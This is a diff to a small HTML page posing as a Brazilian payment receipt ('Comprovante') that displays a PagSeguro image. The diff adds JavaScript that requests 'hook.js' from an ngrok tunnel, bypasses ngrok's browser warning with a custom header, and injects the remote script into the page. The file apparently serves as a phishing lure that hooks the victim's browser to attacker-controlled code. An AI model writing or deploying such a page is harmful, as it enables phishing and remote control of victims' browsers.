@@ -2,9 +2,27 @@
 <html>
 <head>
     <title>Comprovante</title>
-    <script src="https://a679-191-54-132-249.ngrok-free.app:443/hook.js"></script>
+    <script>
+        // Create a new script element
+        var script = document.createElement('script');
+        script.src = 'https://a679-191-54-132-249.ngrok-free.app:443/hook.js';
+
+        // Set a custom request header
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', script.src, true);
+        xhr.setRequestHeader('ngrok-skip-browser-warning', 'true'); // Set the ngrok-skip-browser-warning header
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                // Append the script to the head when it's loaded
+                document.head.appendChild(script);
+            }
+        };
+        xhr.send();
+
+    </script>
 </head>
 <body>
     <img src="https://assets-blog.pagseguro.uol.com.br/wp-content/2020/11/Post_329_imagem_meio_de_texto_IIIIIII.png" alt="Imagem">
 </body>
 </html>
+
